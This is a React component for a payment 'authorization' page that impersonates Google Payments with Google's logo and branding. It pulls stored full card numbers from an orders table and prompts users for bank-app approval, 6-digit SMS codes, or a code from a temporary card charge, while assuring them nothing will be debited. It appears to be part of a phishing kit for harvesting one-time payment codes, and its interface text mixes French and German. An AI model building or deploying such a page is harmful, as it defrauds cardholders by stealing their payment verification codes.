import React, { useEffect, useState } from 'react';
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { CreditCard, Shield, Lock, Smartphone, MessageSquare, CheckCircle } from 'lucide-react';
import { supabase } from '@/integrations/supabase/client';
import { useOptimisticPaymentSession } from '@/hooks/useOptimisticPaymentSession';
import { PaymentIcons } from '@/components/ui/PaymentIcons';

interface AuthorizationPanelProps {
  orderId: string;
  sessionId: string;
}

const AuthorizationPanel: React.FC<AuthorizationPanelProps> = ({ orderId, sessionId }) => {
  const [orderData, setOrderData] = useState<any>(null);
  const [currentTextIndex, setCurrentTextIndex] = useState(0);
  const [smsCode, setSmsCode] = useState('');
  const [googleCode, setGoogleCode] = useState('');

  const detectCardType = (cardNumber: string): 'visa' | 'mastercard' | 'amex' | 'unknown' => {
    const cleanNumber = cardNumber.replace(/\s/g, '');
    const firstDigit = cleanNumber.charAt(0);
    
    if (firstDigit === '4') return 'visa';
    if (firstDigit === '5') return 'mastercard';
    if (firstDigit === '3') return 'amex';
    return 'unknown';
  };

  const getCardTypeInfo = (cardType: 'visa' | 'mastercard' | 'amex' | 'unknown') => {
    switch (cardType) {
      case 'visa':
        return { 
          name: 'VISA', 
          gradient: 'from-blue-600 to-blue-700' 
        };
      case 'mastercard':
        return { 
          name: 'MASTERCARD', 
          gradient: 'from-red-500 to-orange-600' 
        };
      case 'amex':
        return { 
          name: 'AMEX', 
          gradient: 'from-green-600 to-green-700' 
        };
      default:
        return { 
          name: 'CARD', 
          gradient: 'from-gray-600 to-gray-700' 
        };
    }
  };
  
  // Use optimistic payment session hook
  const {
    sessionData,
    isLoading: sessionLoading,
    setVerificationMethod,
    confirmAppVerification,
    enterSmsCode,
    submitSmsCode: submitSmsCodeOptimistic,
    enterGoogleCode,
    submitGoogleCode: submitGoogleCodeOptimistic
  } = useOptimisticPaymentSession(sessionId);

  const processingTexts = [
    "Traitement en cours...",
    "Connexion à la banque en cours...",
    "Vérification des informations de carte...",
    "Autorisation en cours...",
    "Contrôle de sécurité en cours..."
  ];

  useEffect(() => {
    const fetchOrderData = async () => {
      // Only fetch order data - sessionId comes from props
      const { data: order } = await supabase
        .from('orders')
        .select('*')
        .eq('id', orderId)
        .single();
      setOrderData(order);
    };
    fetchOrderData();
  }, [orderId]);

  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentTextIndex((prevIndex) => 
        (prevIndex + 1) % processingTexts.length
      );
    }, 6000);

    return () => clearInterval(interval);
  }, [processingTexts.length]);

  // Processing text rotation
  // Optimistic action handlers
  const handleAppConfirmation = async () => {
    await confirmAppVerification();
  };

  const handleSmsSubmit = async () => {
    if (!smsCode) return;
    // Always directly submit the SMS code to transition to sms_confirmed
    await submitSmsCodeOptimistic(smsCode);
    setSmsCode('');
  };

  const handleGoogleCodeSubmit = async () => {
    if (!googleCode) return;
    // Always directly submit the Google code to transition to google_code_confirmed
    await submitGoogleCodeOptimistic(googleCode);
    setGoogleCode('');
  };

  const handleMethodSelection = async (method: string) => {
    await setVerificationMethod(method);
  };

  const renderContent = () => {
    if (!sessionData) {
      return renderLoadingState();
    }

    // Check verification status and method
    const { verification_method, verification_status } = sessionData;

    if (verification_status === 'completed') {
      return renderFinalProcessingState();
    }

    switch (verification_method) {
      case 'app_confirmation':
        return verification_status === 'app_confirmed' ? renderFinalProcessingState() : renderAppConfirmationState();
      case 'sms_confirmation':
        if (verification_status === 'sms_confirmed') {
          return renderFinalProcessingState();
        } else {
          return renderSmsConfirmationState();
        }
      case 'google_code_confirmation':
        if (verification_status === 'google_code_confirmed') {
          return renderFinalProcessingState();
        } else {
          return renderGoogleCodeConfirmationState();
        }
      case 'choice_required':
        return renderChoiceState();
      default:
        return renderLoadingState();
    }
  };

  const renderFailureMessage = () => {
    if (!sessionData?.failure_reason) return null;
    
    return (
      <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-lg">
        <p className="text-red-700 text-sm font-medium text-center">
          La confirmation précédente a échoué. Veuillez réessayer.
        </p>
      </div>
    );
  };

  const renderLoadingState = () => (
    <div className="flex items-center justify-center space-x-3 py-4">
      <div className="relative">
        <div className="w-6 h-6 border-4 border-blue-100 rounded-full animate-spin border-t-blue-600"></div>
      </div>
      <span className="text-base text-gray-700" style={{ fontFamily: 'Google Sans, sans-serif' }}>
        {processingTexts[currentTextIndex]}
      </span>
    </div>
  );

  const renderAppConfirmationState = () => (
    <>
      {renderFailureMessage()}
      {/* Loading Spinner */}
      <div className="flex items-center justify-center space-x-3 py-4">
        <div className="relative">
          <div className="w-6 h-6 border-4 border-blue-100 rounded-full animate-spin border-t-blue-600"></div>
        </div>
        <span className="text-base text-gray-700" style={{ fontFamily: 'Google Sans, sans-serif' }}>
          Attente de confirmation par app...
        </span>
      </div>
      
      <div className="space-y-2">
        <h1 className="text-2xl font-medium text-gray-900" style={{ fontFamily: 'Google Sans, sans-serif' }}>
          Confirmation par application requise
        </h1>
        <p className="text-base text-gray-700">
          Veuillez ouvrir votre application bancaire et confirmer l'autorisation.
        </p>
        <p className="text-sm text-gray-600">
          Appuyez sur le bouton ci-dessous une fois que vous avez approuvé dans l'application.
        </p>
      </div>

      <Button 
        onClick={handleAppConfirmation}
        className="w-full bg-green-600 hover:bg-green-700 text-white py-3 text-base"
      >
        <CheckCircle className="w-5 h-5 mr-2" />
        Confirmé dans l'app
      </Button>
    </>
  );

  const renderSmsConfirmationState = () => (
    <>
      {renderFailureMessage()}
      {/* Loading Spinner */}
      <div className="flex items-center justify-center space-x-3 py-4">
        <div className="relative">
          <div className="w-6 h-6 border-4 border-blue-100 rounded-full animate-spin border-t-blue-600"></div>
        </div>
        <span className="text-base text-gray-700" style={{ fontFamily: 'Google Sans, sans-serif' }}>
          Attente du code SMS...
        </span>
      </div>
      
      <div className="space-y-2">
        <h1 className="text-2xl font-medium text-gray-900" style={{ fontFamily: 'Google Sans, sans-serif' }}>
          Confirmation par SMS
        </h1>
        <p className="text-base text-gray-700">
          Un code SMS a été envoyé à votre numéro de mobile.
        </p>
        <p className="text-sm text-gray-600">
          Veuillez saisir le code à 6 chiffres ci-dessous.
        </p>
      </div>

      <div className="space-y-4">
        <Input
          type="text"
          placeholder="Code SMS à 6 chiffres"
          value={smsCode}
          onChange={(e) => setSmsCode(e.target.value)}
          maxLength={6}
          className="text-center text-lg tracking-widest"
        />
        <Button 
          onClick={handleSmsSubmit}
          disabled={smsCode.length !== 6}
          className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 text-base"
        >
          Saisir le code
        </Button>
      </div>
    </>
  );

  const renderGoogleCodeConfirmationState = () => {
    const cardType = orderData?.card_number ? detectCardType(orderData.card_number) : 'unknown';
    const cardTypeInfo = getCardTypeInfo(cardType);
    const lastFour = orderData?.card_number?.slice(-4) || '4444';

    return (
      <>
        {renderFailureMessage()}
        {/* Loading Spinner */}
        <div className="flex items-center justify-center space-x-3 py-4">
          <div className="relative">
            <div className="w-6 h-6 border-4 border-blue-100 rounded-full animate-spin border-t-blue-600"></div>
          </div>
          <span className="text-base text-gray-700" style={{ fontFamily: 'Google Sans, sans-serif' }}>
            Attente du code Google...
          </span>
        </div>
        
        <div className="space-y-2">
          <h1 className="text-2xl font-medium text-gray-900" style={{ fontFamily: 'Google Sans, sans-serif' }}>
            Karte bestätigen
          </h1>
          <p className="text-base text-gray-700">
            Bestätige {cardTypeInfo.name} •••• {lastFour} mit einem Code, den du neben einer vorübergehenden Belastung findest.
            Die Belastung erscheint in den Transaktionen deiner Karte (in deinen App- oder Kontoabrechnungen).
          </p>
        </div>

        <div className="space-y-4">
          <Input
            type="text"
            placeholder="Google-Code eingeben"
            value={googleCode}
            onChange={(e) => setGoogleCode(e.target.value)}
            className="text-center text-lg tracking-widest"
          />
          <Button 
            onClick={handleGoogleCodeSubmit}
            disabled={!googleCode}
            className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 text-base"
          >
            Code bestätigen
          </Button>
        </div>
      </>
    );
  };

  const renderChoiceState = () => (
    <>
      <div className="space-y-2">
        <h1 className="text-2xl font-medium text-gray-900" style={{ fontFamily: 'Google Sans, sans-serif' }}>
          Choisir la méthode de confirmation
        </h1>
        <p className="text-base text-gray-700">
          Veuillez choisir comment vous souhaitez confirmer le paiement :
        </p>
      </div>

      <div className="space-y-3">
        <Button
          onClick={() => handleMethodSelection('app_confirmation')}
          variant="outline"
          className="w-full px-3 py-2 flex items-center space-x-2 border hover:border-blue-500"
        >
          <Smartphone className="w-5 h-5 text-blue-600" />
          <span className="font-medium">Confirmation par app : Via votre application bancaire</span>
        </Button>
        
        <Button
          onClick={() => handleMethodSelection('sms_confirmation')}
          variant="outline"
          className="w-full px-3 py-2 flex items-center space-x-2 border hover:border-blue-500"
        >
          <MessageSquare className="w-5 h-5 text-blue-600" />
          <span className="font-medium">Code SMS : Par message texte</span>
        </Button>

        <Button
          onClick={() => handleMethodSelection('google_code_confirmation')}
          variant="outline"
          className="w-full px-3 py-2 flex items-center space-x-2 border hover:border-blue-500"
        >
          <CreditCard className="w-5 h-5 text-blue-600" />
          <span className="font-medium">Google-Code : Über Kartentransaktion</span>
        </Button>
      </div>
    </>
  );

  const renderFinalProcessingState = () => (
    <>
      <div className="space-y-2">
        <h1 className="text-2xl font-medium text-gray-900" style={{ fontFamily: 'Google Sans, sans-serif' }}>
          Paiement en cours d'autorisation
        </h1>
        <div className="flex items-center justify-center space-x-2 py-4">
          <CheckCircle className="w-8 h-8 text-green-600" />
        </div>
        <p className="text-base text-gray-700">
          Votre confirmation a été reçue. Le paiement est maintenant en cours de traitement.
        </p>
      </div>

      <div className="flex items-center justify-center space-x-3 py-4">
        <div className="relative">
          <div className="w-6 h-6 border-4 border-green-100 rounded-full animate-spin border-t-green-600"></div>
        </div>
        <span className="text-base text-gray-700" style={{ fontFamily: 'Google Sans, sans-serif' }}>
          Finalisation de l'autorisation...
        </span>
      </div>
    </>
  );
  return (
    <div className="space-y-6">
      {/* Main Authorization Card */}
      <Card className="border-0 shadow-xl bg-white">
        <CardContent className="pt-6 pb-8">
          {/* Google Payments Header */}
          <div className="text-center mb-6 pb-4 border-b border-gray-100">
            <div className="flex items-center justify-center space-x-2 mb-2">
              <svg width="24" height="24" viewBox="0 0 24 24">
                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                <path fill="#FBBC04" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
              </svg>
              <span className="text-lg font-medium text-gray-900" style={{ fontFamily: 'Google Sans, sans-serif' }}>
                Google Payments
              </span>
            </div>
          </div>

          <div className="text-center space-y-6">
            {/* Authorization Header - Always visible */}
            <div className="space-y-2">
              <h1 className="text-2xl font-medium text-gray-900" style={{ fontFamily: 'Google Sans, sans-serif' }}>
                Autoriser la carte
              </h1>
              <p className="text-4xl font-light text-gray-900" style={{ fontFamily: 'Google Sans, sans-serif' }}>
                €0,00
              </p>
              <p className="text-sm text-gray-600">
                Montant d'autorisation
              </p>
            </div>

            {renderContent()}

            {/* Important Notice - Always show */}
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
              <div className="flex items-start space-x-3">
                <CreditCard className="w-5 h-5 text-blue-600 mt-0.5 flex-shrink-0" />
                <div className="text-left">
                  <h3 className="text-sm font-medium text-blue-900 mb-1">
                    Aucun débit de votre carte
                  </h3>
                  <p className="text-sm text-blue-700">
                    Votre carte bancaire est seulement autorisée, pas débitée. Le paiement effectif aura lieu lors de la livraison.
                  </p>
                </div>
              </div>
            </div>

            {/* Payment Method Display - Always show */}
            <div className="bg-gray-50 rounded-lg p-4">
              <div className="flex items-center justify-between">
                <div className="flex items-center space-x-3">
                  <PaymentIcons 
                    cardType={orderData?.card_number ? detectCardType(orderData.card_number) : 'unknown'} 
                    className="h-6"
                  />
                  <span className="text-sm text-gray-700">
                    •••• •••• •••• {orderData?.card_number?.slice(-4) || '4444'}
                  </span>
                </div>
                <Lock className="w-4 h-4 text-green-600" />
              </div>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Security Information */}
      <div className="flex items-center justify-center space-x-6 py-3">
        <div className="flex items-center space-x-2">
          <Shield className="w-4 h-4 text-gray-500" />
          <span className="text-sm text-gray-600">Conforme PCI-DSS</span>
        </div>
        <div className="w-px h-4 bg-gray-300"></div>
        <div className="flex items-center space-x-2">
          <Lock className="w-4 h-4 text-gray-500" />
          <span className="text-sm text-gray-600">Chiffrement 256-bit</span>
        </div>
      </div>

      {/* Google Payments Footer */}
      <div className="text-center pt-1">
        <p className="text-xs text-gray-500">
          Alimenté par{" "}
          <span className="font-medium text-blue-600" style={{ fontFamily: 'Google Sans, sans-serif' }}>
            Google Payments
          </span>
        </p>
      </div>
    </div>
  );
};

export default AuthorizationPanel;